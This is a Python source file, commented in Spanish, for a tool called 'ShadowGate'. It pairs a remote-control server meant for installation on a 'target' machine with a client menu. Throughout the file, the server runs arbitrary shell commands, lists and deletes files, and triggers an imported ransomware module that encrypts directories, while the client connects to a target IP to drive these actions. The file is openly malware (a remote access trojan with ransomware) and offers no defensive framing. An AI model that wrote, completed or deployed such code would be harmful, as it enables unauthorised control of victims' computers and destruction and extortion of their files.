#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import hashlib
import socket
import sys
import threading
import json
import struct
import subprocess
import os
import time
from cryptography.fernet import Fernet
from termcolor import colored

# ==================== CONFIGURACIÓN GLOBAL ====================
CONFIG = {
    'control_port': 5560,
    'screen_port': 5555,
    'encryption_key': Fernet.generate_key(),  # Clave única por instalación
    'security_pin': hashlib.sha256("MI_PIN_SECRETO".encode()).digest(),
    'auto_start_server': True,
    'stealth_mode': False
}


# ==================== SISTEMA DE CIFRADO ====================
class EncryptionSystem:
    def __init__(self, key):
        self.cipher = Fernet(key)

    def encrypt(self, data):
        """Cifrar datos"""
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.encrypt(data)

    def decrypt(self, encrypted_data):
        """Descifrar datos"""
        return self.cipher.decrypt(encrypted_data).decode()


# ==================== SERVIDOR DE CONTROL (OBJETIVO) ====================
class ControlServer:
    def __init__(self, encryption_system):
        self.encryption = encryption_system
        self.running = False
        self.server_socket = None

    def handle_client(self, client_socket, address):
        """Manejar peticiones de clientes remotos"""
        try:
            while self.running:
                # Recibir tamaño del mensaje
                size_data = client_socket.recv(4)
                if not size_data:
                    break

                size = struct.unpack('!I', size_data)[0]
                encrypted_data = client_socket.recv(size)

                # Descifrar mensaje
                decrypted_data = self.encryption.decrypt(encrypted_data)
                command = json.loads(decrypted_data)

                # Ejecutar comando
                response = self.execute_command(command)

                # Enviar respuesta cifrada
                encrypted_response = self.encryption.encrypt(json.dumps(response))
                client_socket.sendall(struct.pack('!I', len(encrypted_response)))
                client_socket.sendall(encrypted_response)

        except Exception as e:
            print(colored(f"Error con cliente {address}: {e}", 'red'))
        finally:
            client_socket.close()

    def execute_command(self, command):
        """Ejecutar comando recibido"""
        try:
            cmd_type = command.get('type')
            data = command.get('data', {})

            if cmd_type == 'system_command':
                # Ejecutar comando de sistema
                result = subprocess.run(
                    data['command'],
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                return {
                    'success': True,
                    'output': result.stdout,
                    'error': result.stderr
                }

            elif cmd_type == 'file_operation':
                # Operaciones con archivos
                action = data.get('action')
                if action == 'list_directory':
                    files = os.listdir(data['path'])
                    return {'success': True, 'files': files}
                elif action == 'delete_file':
                    os.remove(data['path'])
                    return {'success': True}

            elif cmd_type == 'ransomware':
                # Operaciones de ransomware
                from ramsofware import Ransomware
                ransomware = Ransomware(CONFIG['security_pin'])

                if data['action'] == 'encrypt':
                    if ransomware.verify_pin(data['pin']):
                        success = ransomware.encrypt_directory(data['path'])
                        return {'success': success}

                elif data['action'] == 'decrypt':
                    if ransomware.verify_pin(data['pin']):
                        success = ransomware.decrypt_directory(data['path'])
                        return {'success': success}

            return {'success': False, 'error': 'Comando desconocido'}

        except Exception as e:
            return {'success': False, 'error': str(e)}

    def start_server(self):
        """Iniciar servidor de control"""
        self.running = True
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            self.server_socket.bind(('0.0.0.0', CONFIG['control_port']))
            self.server_socket.listen(5)
            print(colored(f"🖥️  Servidor de control escuchando en puerto {CONFIG['control_port']}", 'green'))

            while self.running:
                client_socket, address = self.server_socket.accept()
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, address),
                    daemon=True
                )
                client_thread.start()

        except Exception as e:
            print(colored(f"❌ Error en servidor: {e}", 'red'))

    def stop_server(self):
        """Detener servidor"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()


# ==================== CLIENTE DE CONTROL (TU MÁQUINA) ====================
class ControlClient:
    def __init__(self, encryption_system):
        self.encryption = encryption_system
        self.socket = None

    def connect(self, target_ip):
        """Conectar a objetivo remoto"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((target_ip, CONFIG['control_port']))
            return True
        except Exception as e:
            print(colored(f"❌ Error conectando a {target_ip}: {e}", 'red'))
            return False

    def send_command(self, command_type, data):
        """Enviar comando al objetivo"""
        if not self.socket:
            return {'success': False, 'error': 'No conectado'}

        try:
            # Crear y cifrar comando
            command = {'type': command_type, 'data': data}
            encrypted_command = self.encryption.encrypt(json.dumps(command))

            # Enviar tamaño y datos
            self.socket.sendall(struct.pack('!I', len(encrypted_command)))
            self.socket.sendall(encrypted_command)

            # Recibir respuesta
            size_data = self.socket.recv(4)
            if not size_data:
                return {'success': False, 'error': 'Conexión cerrada'}

            size = struct.unpack('!I', size_data)[0]
            encrypted_response = self.socket.recv(size)

            # Descifrar y retornar respuesta
            decrypted_response = self.encryption.decrypt(encrypted_response)
            return json.loads(decrypted_response)

        except Exception as e:
            return {'success': False, 'error': str(e)}

    def disconnect(self):
        """Desconectar del objetivo"""
        if self.socket:
            self.socket.close()
            self.socket = None


# ==================== SISTEMA UNIFICADO ====================
class ShadowGateSystem:
    def __init__(self):
        self.encryption = EncryptionSystem(CONFIG['encryption_key'])
        self.server = ControlServer(self.encryption)
        self.client = ControlClient(self.encryption)
        self.current_target = None

        # Iniciar servidor automáticamente si está configurado
        if CONFIG['auto_start_server']:
            self.start_server()

    def start_server(self):
        """Iniciar servidor en segundo plano"""
        server_thread = threading.Thread(target=self.server.start_server, daemon=True)
        server_thread.start()
        print(colored("✅ Servidor iniciado en segundo plano", 'green'))

    def connect_to_target(self, target_ip):
        """Conectar a objetivo remoto"""
        if self.client.connect(target_ip):
            self.current_target = target_ip
            print(colored(f"✅ Conectado a {target_ip}", 'green'))
            return True
        return False

    def execute_remote_command(self, command):
        """Ejecutar comando en objetivo remoto"""
        if not self.current_target:
            print(colored("❌ No hay objetivo conectado", 'red'))
            return None

        result = self.client.send_command('system_command', {'command': command})
        if result['success']:
            print(colored("✅ Comando ejecutado:", 'green'))
            print(result.get('output', ''))
            if result.get('error'):
                print(colored("Errores:", 'yellow'))
                print(result['error'])
        else:
            print(colored(f"❌ Error: {result.get('error', 'Desconocido')}", 'red'))

        return result

    def run_ransomware(self, target_path, pin, action='encrypt'):
        """Ejecutar ransomware en objetivo"""
        if not self.current_target:
            print(colored("❌ No hay objetivo conectado", 'red'))
            return False

        result = self.client.send_command('ransomware', {
            'action': action,
            'path': target_path,
            'pin': pin
        })

        if result['success']:
            print(colored(f"✅ Ransomware {action} completado en {target_path}", 'green'))
        else:
            print(colored(f"❌ Error: {result.get('error', 'Desconocido')}", 'red'))

        return result['success']

    def interactive_menu(self):
        """Menú interactivo de control"""
        while True:
            print("\n" + "=" * 60)
            print(colored("🕶️  SHADOWGATE - CONTROL REMOTO INTEGRADO", 'cyan', attrs=['bold']))
            print("=" * 60)

            if self.current_target:
                print(colored(f"Objetivo actual: {self.current_target}", 'green'))
            else:
                print(colored("Sin objetivo conectado", 'yellow'))

            print("\n1. Conectar a objetivo")
            print("2. Ejecutar comando remoto")
            print("3. Encriptar archivos (Ransomware)")
            print("4. Desencriptar archivos")
            print("5. Listar archivos remotos")
            print("6. Ver información del sistema")
            print("7. Capturar pantalla remota")
            print("8. Desconectar")
            print("9. Estado del servidor")
            print("0. Salir")
            print("=" * 60)

            choice = input("Selecciona opción: ").strip()

            if choice == "1":
                target_ip = input("IP del objetivo: ").strip()
                self.connect_to_target(target_ip)

            elif choice == "2" and self.current_target:
                command = input("Comando a ejecutar: ").strip()
                self.execute_remote_command(command)

            elif choice == "3" and self.current_target:
                path = input("Ruta a encriptar: ").strip()
                pin = input("PIN de seguridad: ").strip()
                self.run_ransomware(path, pin, 'encrypt')

            elif choice == "4" and self.current_target:
                path = input("Ruta a desencriptar: ").strip()
                pin = input("PIN de seguridad: ").strip()
                self.run_ransomware(path, pin, 'decrypt')

            elif choice == "5" and self.current_target:
                path = input("Ruta a listar: ").strip() or "."
                result = self.client.send_command('file_operation', {
                    'action': 'list_directory',
                    'path': path
                })
                if result['success']:
                    print(colored("📁 Archivos:", 'green'))
                    for file in result.get('files', []):
                        print(f"  - {file}")
                else:
                    print(colored(f"❌ Error: {result.get('error')}", 'red'))

            elif choice == "6" and self.current_target:
                self.execute_remote_command("systeminfo")

            elif choice == "7" and self.current_target:
                print(colored("🖥️  Iniciando visualización de pantalla...", 'yellow'))
                # Aquí integrarías el módulo de screen streaming

            elif choice == "8":
                self.client.disconnect()
                self.current_target = None
                print(colored("🔌 Desconectado", 'yellow'))

            elif choice == "9":
                status = "ACTIVO" if self.server.running else "INACTIVO"
                print(colored(f"Estado del servidor: {status}", 'green'))

            elif choice == "0":
                print(colored("👋 Saliendo...", 'blue'))
                break

            else:
                print(colored("❌ Opción no válida o sin objetivo conectado", 'red'))

            input("\nPresiona Enter para continuar...")


# ==================== EJECUCIÓN PRINCIPAL ====================
if __name__ == "__main__":
    # Verificar si estamos en modo servidor o cliente
    if len(sys.argv) > 1 and sys.argv[1] == "server":
        # Modo solo servidor (para instalación en objetivo)
        print(colored("🚀 Iniciando ShadowGate en modo servidor...", 'green'))
        encryption = EncryptionSystem(CONFIG['encryption_key'])
        server = ControlServer(encryption)
        server.start_server()

        # Mantener el programa ejecutándose
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(colored("\n🛑 Servidor detenido", 'red'))

    else:
        # Modo interactivo completo (cliente + servidor)
        print(colored("🎯 Iniciando ShadowGate System completo...", 'cyan'))
        system = ShadowGateSystem()
        system.interactive_menu()